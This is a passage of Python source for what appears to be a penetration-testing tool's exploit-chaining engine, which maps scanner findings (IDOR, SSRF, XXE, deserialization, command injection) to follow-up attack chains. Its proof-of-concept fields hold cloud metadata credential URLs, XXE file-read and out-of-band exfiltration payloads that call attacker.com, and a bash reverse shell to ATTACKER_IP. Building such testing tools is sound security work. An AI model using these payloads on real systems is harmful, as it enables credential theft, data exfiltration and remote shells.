                        "1. Identify user-specific resource (e.g., /api/user/123/profile)",
                        "2. Change ID to another user (e.g., /api/user/456/profile)",
                        "3. Access data belonging to other users",
                    ],
                },
            },
        }]

    async def _idor_vertical_escalation(self, finding: Dict, context: Dict) -> List[Dict]:
        """IDOR vertical privilege escalation."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "idor_vertical_chain",
            "name": "IDOR → Vertical Privilege Escalation",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "IDOR may allow accessing admin/privileged resources",
            "metadata": {
                "chain_type": "idor_vertical",
                "poc": {
                    "admin_ids_to_try": ["1", "0", "admin", "root"],
                    "admin_endpoints": ["/admin", "/api/admin", "/api/users/1"],
                },
            },
        }]

    async def _auth_test_admin_endpoints(self, finding: Dict, context: Dict) -> List[Dict]:
        """Test admin endpoints after auth bypass."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "auth_bypass_admin_chain",
            "name": "Auth Bypass → Admin Functionality Access",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "Authentication bypass enables testing admin functionality",
            "metadata": {
                "chain_type": "auth_to_admin",
                "poc": {
                    "admin_endpoints_to_test": [
                        "/admin",
                        "/admin/users",
                        "/admin/settings",
                        "/api/admin/users",
                        "/dashboard",
                    ],
                },
            },
        }]

    async def _auth_enumerate_users(self, finding: Dict, context: Dict) -> List[Dict]:
        """Enumerate users after auth bypass."""
        return [{
            "type": "auth_bypass_enum_chain",
            "name": "Auth Bypass → User Enumeration",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "auth_to_enum",
                "poc": {
                    "enumeration_endpoints": ["/api/users", "/api/admin/users", "/users/list"],
                },
            },
        }]

    async def _default_creds_authenticated_scan(self, finding: Dict, context: Dict) -> List[Dict]:
        """Run authenticated scan with default credentials."""
        return [{
            "type": "default_creds_chain",
            "name": "Default Credentials → Authenticated Scan Ready",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "description": "Default credentials allow full authenticated testing",
            "metadata": {
                "chain_type": "creds_to_auth_scan",
                "poc": {
                    "steps": [
                        "1. Authenticate with discovered credentials",
                        "2. Re-run all scanners with authenticated session",
                        "3. Test privileged functionality",
                    ],
                },
            },
        }]

    async def _ssrf_cloud_metadata(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF cloud metadata extraction."""
        endpoint = context.get("vulnerable_endpoint", finding.get("matched_at"))

        return [{
            "type": "ssrf_cloud_metadata_chain",
            "name": "SSRF → Cloud Metadata Extraction",
            "severity": "CRITICAL",
            "matched_at": endpoint,
            "description": "SSRF can extract cloud provider metadata and credentials",
            "metadata": {
                "chain_type": "ssrf_cloud_metadata",
                "poc": {
                    "aws_endpoints": [
                        "http://169.254.169.254/latest/meta-data/",
                        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                        "http://169.254.169.254/latest/user-data",
                    ],
                    "gcp_endpoints": [
                        "http://metadata.google.internal/computeMetadata/v1/",
                        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                    ],
                    "azure_endpoints": [
                        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                        "http://169.254.169.254/metadata/identity/oauth2/token",
                    ],
                },
            },
        }]

    async def _ssrf_internal_port_scan(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF internal port scan."""
        return [{
            "type": "ssrf_port_scan_chain",
            "name": "SSRF → Internal Port Scan",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "ssrf_port_scan",
                "poc": {
                    "scan_targets": ["127.0.0.1", "10.0.0.1", "192.168.1.1"],
                    "common_ports": [22, 80, 443, 3306, 5432, 6379, 27017, 8080],
                },
            },
        }]

    async def _ssrf_internal_services(self, finding: Dict, context: Dict) -> List[Dict]:
        """SSRF internal services access."""
        return [{
            "type": "ssrf_internal_services_chain",
            "name": "SSRF → Internal Services Access",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "ssrf_internal_services",
                "poc": {
                    "services_to_target": {
                        "redis": "http://127.0.0.1:6379/",
                        "elasticsearch": "http://127.0.0.1:9200/_cat/indices",
                        "mongodb": "http://127.0.0.1:27017/",
                        "consul": "http://127.0.0.1:8500/v1/agent/members",
                    },
                },
            },
        }]

    async def _xxe_file_extraction(self, finding: Dict, context: Dict) -> List[Dict]:
        """XXE file extraction."""
        return [{
            "type": "xxe_file_extraction_chain",
            "name": "XXE → Sensitive File Extraction",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "xxe_file_read",
                "poc": {
                    "target_files": ["/etc/passwd", "/etc/shadow", "/.env", "/var/www/config.php"],
                    "payload_template": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file}">]><foo>&xxe;</foo>',
                },
            },
        }]

    async def _xxe_ssrf(self, finding: Dict, context: Dict) -> List[Dict]:
        """XXE to SSRF."""
        return [{
            "type": "xxe_ssrf_chain",
            "name": "XXE → SSRF to Internal Services",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "xxe_ssrf",
                "poc": {
                    "payload": '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
                },
            },
        }]

    async def _xxe_oob_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
        """XXE out-of-band exfiltration."""
        return [{
            "type": "xxe_oob_chain",
            "name": "XXE → Out-of-Band Data Exfiltration",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "xxe_oob",
                "poc": {
                    "technique": "External DTD with parameter entities",
                    "steps": [
                        "1. Host malicious DTD: <!ENTITY % data SYSTEM 'file:///etc/passwd'>",
                        "2. DTD sends data: <!ENTITY % exfil '<!ENTITY &#37; send SYSTEM \"http://attacker.com/?d=%data;\">'>",
                        "3. Trigger with: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>",
                    ],
                },
            },
        }]

    # Placeholder implementations for remaining handlers
    async def _deser_java_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_java_chain",
            "name": "Java Deserialization → ysoserial RCE",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "java_deser_rce", "poc": {"tool": "ysoserial"}},
        }]

    async def _deser_php_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_php_chain",
            "name": "PHP Deserialization → Object Injection RCE",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "php_deser_rce", "poc": {"tool": "phpggc"}},
        }]

    async def _deser_python_pickle(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_python_chain",
            "name": "Python Pickle → RCE",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "python_pickle_rce"},
        }]

    async def _deser_dotnet_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "deser_dotnet_chain",
            "name": ".NET Deserialization → ysoserial.net RCE",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "dotnet_deser_rce", "poc": {"tool": "ysoserial.net"}},
        }]

    async def _ssti_rce(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "ssti_rce_chain",
            "name": "SSTI → Template Engine RCE",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "ssti_rce"},
        }]

    async def _cmdi_reverse_shell_prep(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "cmdi_revshell_chain",
            "name": "Command Injection → Reverse Shell Prepared",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {
                "chain_type": "cmdi_revshell",
                "poc": {
                    "bash_revshell": "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                    "python_revshell": "python -c 'import socket,subprocess,os;...'",
                },
            },
        }]

    async def _cmdi_data_exfiltration(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "cmdi_exfil_chain",
            "name": "Command Injection → Data Exfiltration",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "cmdi_exfil"},
        }]

    async def _redirect_oauth_theft(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "redirect_oauth_chain",
            "name": "Open Redirect → OAuth Token Theft",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "redirect_oauth"},
        }]

    async def _redirect_phishing_demo(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "redirect_phishing_chain",
            "name": "Open Redirect → Phishing Chain",
            "severity": "MEDIUM",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "redirect_phishing"},
        }]

    async def _info_cve_search(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "info_cve_chain",
            "name": "Version Disclosure → CVE Search",
            "severity": "HIGH",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "version_to_cve"},
        }]

    async def _info_credential_search(self, finding: Dict, context: Dict) -> List[Dict]:
        return [{
            "type": "info_creds_chain",
            "name": "Source Code Disclosure → Credential Search",
            "severity": "CRITICAL",
            "matched_at": context.get("vulnerable_endpoint"),
            "metadata": {"chain_type": "source_to_creds"},
        }]

    def get_statistics(self) -> Dict[str, Any]:
        """Get chain engine statistics."""
        successful = [r for r in self.chain_results if r.success]
        failed = [r for r in self.chain_results if not r.success]

        return {
            "total_findings_processed": len(self.findings_processed),
            "total_chains_executed": len(self.chain_results),
            "successful_chains": len(successful),
            "failed_chains": len(failed),
            "total_chain_findings": sum(len(r.findings) for r in successful),
            "average_execution_time": (
                sum(r.execution_time for r in self.chain_results) / len(self.chain_results)
                if self.chain_results else 0
            ),
        }
